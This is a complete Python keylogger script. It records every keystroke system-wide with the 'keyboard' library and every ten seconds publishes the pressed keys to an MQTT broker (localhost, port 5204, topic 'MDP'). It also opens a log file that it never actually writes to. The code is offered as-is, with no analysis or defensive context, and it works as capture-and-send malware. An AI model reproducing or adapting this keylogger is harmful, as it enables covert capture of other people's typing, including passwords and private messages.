import time
from threading import Timer

import keyboard
import paho.mqtt.client as mqtt

SEND_LOG_EVERY = 10


class Keylogger:
    def __init__(self):
        self.keystrokes = []
        self.file = f"log_{time.time()}.txt"
        self.pressed = {}
        self.client = mqtt.Client()
        self.client.connect("localhost", 5204)

    def write_to_file(self):
        keys = ""
        with open(self.file, "a") as f:
            for key, event_type in self.keystrokes:
                if event_type == "down":
                    keys += key + ' '
        self.client.publish("MDP", keys)

    def log(self):
        if self.keystrokes and not any(self.pressed.values()):
            self.write_to_file()
            self.keystrokes = []
        timer = Timer(interval=SEND_LOG_EVERY, function=self.log)
        timer.daemon = True
        timer.start()

    def start(self):
        self.log()
        while True:
            event: keyboard._keyboard_event.KeyboardEvent = keyboard.read_event()
            self.keystrokes.append((event.name, event.event_type))
            self.pressed[event.scan_code] = event.event_type == "down"


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
